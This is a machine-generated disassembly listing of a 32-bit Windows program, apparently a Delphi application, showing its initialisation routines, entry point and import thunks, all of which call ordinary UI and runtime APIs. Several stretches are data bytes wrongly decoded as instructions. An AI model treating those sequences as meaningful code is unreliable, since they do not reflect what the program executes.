mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_3aeccf8
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3a652f4
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x18 ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_3a6556c
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x14 ]
call sub_3aeccf8
mov edx [ ebp - 0x14 ]
lea eax [ esi + 0x398 ]
call sub_3a652f4
jmp r-xdata
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov [ eax + 0x384 ] edi
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
call sub_3acb6ac
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x384 ]
mov edx r-xdata
call sub_3ae35c4
sub_3af8b51
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3af8c1e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx r-xdata
mov eax r-xdata
call sub_3aa1558
lea eax [ ebp - 0x8 ]
push eax
xor ecx ecx
mov edx r-xdata
mov eax r-xdata
call sub_3aa1558
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af8c25
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x5
call sub_3a65634
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_3ae35c4
sub_3af8e3b
dec [ edx ]
add [ eax ] al
add [ ebp + 0x73 ] al
popad
je r-xdata
or bh bh
push ecx
sbb [ ebp - 0x247bf040 ] al
add [ eax ] al
add [ ebx + 0x3b083 ] cl
add [ ebx + 0x2ba0840 ] cl
add [ eax ] al
add [ ebx + 0x1851ff08 ] cl
jbe r-xdata
mov eax [ ebx + 0x3b0 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
cmp edi [ eax + 0x3e4 ]
jne r-xdata
mov eax [ ebx + 0x3b0 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
call sub_3acb504
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
test eax eax
je r-xdata
outsd
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
xor eax eax
push ebp
push sub_3af8fb7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
push 0x1
push 0x0
mov eax edi
call sub_3ae3058
xor edx edx
push edx
push eax
lea eax [ ebp - 0x4 ]
call sub_3a69958
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax [ ebx + 0x370 ]
call sub_3adeaa4
mov esi eax
mov [ ebx + 0x3b0 ] esi
test esi esi
je r-xdata
mov eax [ ebx + 0x3b0 ]
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
cmp edi [ eax + 0x380 ]
jne r-xdata
mov eax [ ebx + 0x3b0 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
call sub_3acb504
mov eax [ ebx + 0x3b0 ]
call sub_3ada47c
mov edx [ r-xdata ]
call sub_3a64530
cmp edi [ eax + 0x384 ]
jne r-xdata
mov eax [ ebx + 0x3b0 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af8fbe
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ esi + 0x8 ]
mov eax [ ebx + 0x3b0 ]
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
call sub_3acb504
sub_3af8fc8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_3a64b54#4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x388 ]
mov eax [ eax + 0x34 ]
call sub_3a6986c
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a655b8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x374 ]
mov eax [ eax + 0x250 ]
mov edx 0x1
call sub_3ad8570
pop edx
call sub_3ad84cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af9043
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3af904b
[ esi ]
add [ eax ] al
add [ ecx + 0x67 ] al
jne r-xdata
idiv edi
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af91ef
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ esi + 0x8 ]
mov edx 0x2
xor edx edx
mov eax [ ebx + 0x370 ]
call sub_3adeaa4
mov esi eax
mov [ ebx + 0x3b0 ] esi
test esi esi
je r-xdata
popad
outsb
outsd
and [ ebx + 0x6f ] ah
outsb
js r-xdata
mov eax [ ebx + 0x3b0 ]
call sub_3ada47c
mov eax [ ebx + 0x3b0 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
cmp edi [ eax + 0x384 ]
jne r-xdata
jae r-xdata
mov eax [ ebx + 0x3b0 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
cmp edi [ eax + 0x3e4 ]
jne r-xdata
mov eax [ ebx + 0x3b0 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
call sub_3acb504
mov ecx [ ebp - 0x4 ]
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
xor eax eax
push ebp
push sub_3af91e8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push 0x0
mov eax edi
call sub_3ae3058
xor edx edx
push edx
push eax
lea eax [ ebp - 0x4 ]
call sub_3a69958
outsb
popad
and [ eax + 0x6f ] dh
jb r-xdata
mov eax [ ebx + 0x3b0 ]
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
cmp edi [ eax + 0x380 ]
jne r-xdata
mov eax [ ebx + 0x3b0 ]
mov eax [ eax + 0x8 ]
mov edx 0x4
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
call sub_3acb504
mov ecx [ eax ]
call [ ecx + 0x18 ]
test eax eax
je r-xdata
popad
cmp ah [ eax ]
add [ eax ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_3af6a58
call sub_3a83590
retn
mov eax [ ebx + 0x3b0 ]
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
call sub_3acb504
sub_3af91f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push j_sub_3a648a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x370 ]
mov eax [ eax + 0x278 ]
call sub_3adab94
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
inc eax
mov ebx eax
mov [ ebp - 0x4 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
mov eax [ eax + 0x278 ]
mov edx [ ebp - 0x4 ]
call sub_3adabcc
mov eax [ eax + 0x8 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
mov eax [ eax + 0x278 ]
mov edx [ ebp - 0x4 ]
call sub_3adabcc
mov eax [ eax + 0x8 ]
push eax
call GetTickCount
mov ecx eax
mov edx 0x5
pop eax
mov edi [ eax ]
call [ edi + 0x24 ]
mov edx r-xdata
mov eax esi
call sub_3ae35c4
inc [ ebp - 0x4 ]
dec ebx
jne r-xdata
sub_3af9303
dec [ ecx ]
add [ eax ] al
add [ esp + edi * 2 ] bh
inc ebx
insb
outsd
jae r-xdata
inc ebx
jb r-xdata
jl r-xdata
pop ss
add [ eax ] eax
popad
outsd
and [ eax + 0x6f ] dh
jb r-xdata
nop
push 0x40
mov ecx r-xdata
mov edx r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3acf71c
retn
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
xor eax eax
push ebp
push sub_3af9345
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_3aecc50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af934c
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
js r-xdata
dec ebp
popad
imul esp [ ebx + 0x6b ] 0x206e6e6f
push edx
imul esp [ ebx + 0x68 ] 0x2e647261
and [ ebx + 0x6f ] al
outsb
je r-xdata
xchg ebp eax
scasd [ edi ]
add ecx [ ebx + 0x37083 ]
add al ch
sub al 0x57
jae r-xdata
mov ecx [ eax ]
call [ ecx + 0x18 ]
test eax eax
jne r-xdata
je r-xdata
add [ ebx + 0x37083 ] cl
add al ch
popad
push edi
insd
popad
imul ebp [ esi + ebp + 0x63 ] 0x6d6f
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_3af9516
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x370 ]
mov edx [ eax ]
call [ edx + 0xdc ]
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af951d
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_3a652c4
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ac5bc8
mov esi eax
push r-xdata
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0xc ]
xor edx edx
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0xc ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_3aafbb8
mov eax esi
call sub_3acb6ac
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x10 ]
xor edx edx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_3aeccf8
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x18 ]
xor edx edx
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_3a6556c
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x14 ]
call sub_3aeccf8
mov edx [ ebp - 0x14 ]
lea eax [ esi + 0x3e8 ]
call sub_3a652f4
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov ecx esi
mov edx 0x4
mov edi [ eax ]
call [ edi + 0x24 ]
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov [ esi + 0x3e4 ] edx
mov eax edx
mov edx r-xdata
call sub_3ae35c4
add [ ecx + r-xdata ] esp
cmp ah [ eax ]
push ebx
outsb
push 0x61
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov edx 0x4
sub_3af9584
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push j_sub_3a64b54#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x370 ]
mov edx [ eax ]
call [ edx + 0xdc ]
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af968e
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_3a652c4
retn
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov edx 0x6
mov ecx [ eax ]
call [ ecx + 0x18 ]
test eax eax
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ac5bc8
mov esi eax
lea eax [ esi + 0x37c ]
mov edx [ ebp - 0x4 ]
call sub_3a652f4
push r-xdata
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0xc ]
xor edx edx
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0xc ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_3aafbb8
mov eax esi
call sub_3acb6ac
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esi + 0x380 ] eax
mov eax [ ebx + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov ecx esi
mov edx 0x6
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_3af96af
inc [ ecx ]
add [ eax ] al
add [ edx ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push j_sub_3a64b54#2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af96de
retn
sub_3af97f6
test eax 0xafa55003
add eax [ ebx + ebx + 0x3aa ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsub [ ebx - 0x61c7fc51 ]
test eax 0xafa47403
add ebp eax
leave
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x23fc505c ] bh
push ss
stosb [ edi ]
add edi eax
movsb [ edi ] [ esi ]
scasd [ edi ]
add edi [ eax ]
pop ss
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x12c403af ] ch
lodsd [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] bl
scasd [ edi ]
add ecx eax
adc ebp [ ebp - 0x5058bbfd ]
add eax [ eax ]
adc al 0xad
add ebx [ eax - 0x59 ]
scasd [ edi ]
add edx [ eax + 0x6003ad14 ]
cmpsd [ esi ] [ edi ]
scasd [ edi ]
add esp eax
adc al 0xad
add ebp [ eax - 0x59 ]
scasd [ edi ]
add ebx [ edi + edx - 0x52 ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x59 ] dh
scasd [ edi ]
add ebx [ eax ]
int3
sub_3afa000
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_3a62cbc
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_3a661d0
call sub_3a64148
test al al
je r-xdata
call sub_3a6423c
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_3a6139c
mov [ rw-data ] eax
call GetACP
mov [ rw-data ] eax
call sub_3a61384
mov [ rw-data ] eax
call sub_3a64178
sub_3afa0ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3afa11e
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3afa125
retn
mov eax r-xdata
call sub_3a64f8c
mov eax r-xdata
call sub_3a64fb4
cmp [ rw-data ] 0x0
je r-xdata
call sub_3a6da14
mov eax r-xdata
call sub_3a66b54
call sub_3a6db44
call sub_3a6eb24
call sub_3a6e3bc
mov eax rw-data
mov edx r-xdata
call sub_3a652f4
sub_3afa144
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3afa1e5
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3afa1ec
retn
mov eax rw-data
call sub_3a75e44
mov eax sub_3a7096c
mov [ rw-data ] eax
mov eax sub_3a704bc
mov [ rw-data ] eax
mov edx sub_3a703cc
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_3a70c6c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_3a75a38
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_3a70f80
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_3a73f84
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_3a746a4
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_3afa1f8
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_3a64b54
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3afa288
retn
call sub_3a82dbc
mov eax sub_3a846f4
call sub_3a66b44
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6ece8
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_3a66ccc
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7936c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7a740
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7a740
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_3afa2b4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_3a901d0
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_3a90278
mov cx 0x30
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a884e0
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a884e0
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a884e0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a90454
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7a740
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7a740
mov [ rw-data ] eax
mov ecx sub_3a88d64
mov edx sub_3a88d74
mov eax [ sub_3a873b8 ]
call sub_3a79c50
mov ecx r-xdata
mov edx sub_3a88f7c
mov eax [ r-xdata ]
call sub_3a79c50
sub_3afa3dc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_3a672cc
xor edx edx
mov [ eax + 0x18 ] edx
call sub_3a672cc
xor edx edx
mov [ eax + 0x1c ] edx
call sub_3a672cc
xor edx edx
mov [ eax + 0x20 ] edx
call sub_3a672cc
xor edx edx
mov [ eax + 0x24 ] edx
call sub_3a672cc
xor edx edx
mov [ eax + 0x28 ] edx
call sub_3a672cc
xor edx edx
mov [ eax + 0x2c ] edx
call sub_3a672cc
xor edx edx
mov [ eax + 0x30 ] edx
call sub_3a672cc
xor edx edx
mov [ eax + 0x34 ] edx
call sub_3a672cc
xor edx edx
mov [ eax + 0x38 ] edx
xor eax eax
mov [ rw-data ] eax
call sub_3a672cc
mov [ eax + 0x14 ] 0xa0
sub_3afa4b7
add [ ebx - 0x4f944bd3 ] al
add eax [ ecx ]
jae r-xdata
retn
mov eax r-xdata
call sub_3a64fb4
call sub_3aa1588
mov eax [ r-xdata ]
call sub_3a79ac4
mov eax [ r-xdata ]
call sub_3a79b64
mov edx [ r-xdata ]
mov eax [ sub_3a9ca18 ]
call sub_3a79b10
sub_3afa560
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_3a64f8c
mov eax [ r-xdata ]
call sub_3a79ac4
mov eax [ r-xdata ]
call sub_3a79b64
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_3a79b10
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_3a79b10
mov eax [ r-xdata ]
call sub_3a79a08
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a84da0
mov [ rw-data ] eax
sub_3afa5e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3afa66e
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3afa675
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_3abd488
mov eax [ r-xdata ]
call sub_3a79ac4
mov eax [ r-xdata ]
call sub_3a79b64
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_3a79b10
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_3a79b10
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_3a79b10
sub_3afa6ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3afa703
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3afa70a
retn
mov eax sub_3ad12b4
call sub_3a64fb4
call sub_3ad0c88
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_3ac4424
call sub_3a79df8
xor eax eax
mov [ rw-data ] eax
sub_3afa7ac
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_3af13e8
mov eax sub_3af1a54
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov [ eax ] sub_3af1cc4
mov eax r-xdata
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_3af1da0
sub_3afa804
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_3afa91e
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3afa925
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
mov ebx 0x8
mov esi rw-data
inc ebx
add esi 0x4
cmp ebx 0x100
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_3af36ac
mov edx [ ebp - 0x8 ]
mov eax rw-data
call sub_3a652f4
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov edi ebx
mov eax edi
call sub_3af36ac
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_3a652f4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov eax [ rw-data ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_3a652f4
jmp r-xdata
mov eax [ rw-data ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_3a652f4
jmp r-xdata
mov eax [ rw-data ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_3a652f4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_3a652f4
_start
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov eax r-xdata
call sub_3a67318
mov ebx [ rw-data ]
mov eax [ ebx ]
call sub_3acf3c4
mov eax [ ebx ]
mov edx r-xdata
call sub_3acee7c
mov ecx [ rw-data ]
mov eax [ ebx ]
mov edx [ r-xdata ]
call sub_3acf3dc
mov ecx [ rw-data ]
mov eax [ ebx ]
mov edx [ r-xdata ]
call sub_3acf3dc
mov ecx [ rw-data ]
mov eax [ ebx ]
mov edx [ r-xdata ]
call sub_3acf3dc
mov ecx [ rw-data ]
mov eax [ ebx ]
mov edx [ r-xdata ]
call sub_3acf3dc
mov ecx [ rw-data ]
mov eax [ ebx ]
mov edx [ r-xdata ]
call sub_3acf3dc
mov eax [ ebx ]
call sub_3acf514
pop ebx
call sub_3a650f8
sub_3a6116f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_3a66d88
sub_3a61179
add [ esp + 0x4 ] 0xfffffff8
jmp sub_3a66d9c
sub_3a61214
jmp [ rw-data ]
sub_3a6121c
jmp [ rw-data ]
GetFileType
jmp [ GetFileType@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
sub_3a61244
jmp [ rw-data ]
sub_3a61254
jmp [ rw-data ]
sub_3a6127c
jmp [ rw-data ]
sub_3a61284
jmp [ rw-data ]
ExitThread
jmp [ ExitThread@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
sub_3a6129c
jmp [ rw-data ]
sub_3a612a4
jmp [ rw-data ]
sub_3a612ac
jmp [ rw-data ]
sub_3a612b4
jmp [ rw-data ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_3a612cc
jmp [ rw-data ]
sub_3a612d4
jmp [ rw-data ]
sub_3a612dc
jmp [ rw-data ]
sub_3a612e4
jmp [ rw-data ]
sub_3a612ec
jmp [ rw-data ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_3a612fc
jmp [ rw-data ]
sub_3a6130c
jmp [ rw-data ]
sub_3a61324
jmp [ rw-data ]
sub_3a6132c
jmp [ rw-data ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_3a61354
jmp [ rw-data ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
sub_3a6136c
jmp [ rw-data ]
sub_3a61374
jmp [ rw-data ]
sub_3a6137c
jmp [ rw-data ]
sub_3a61384
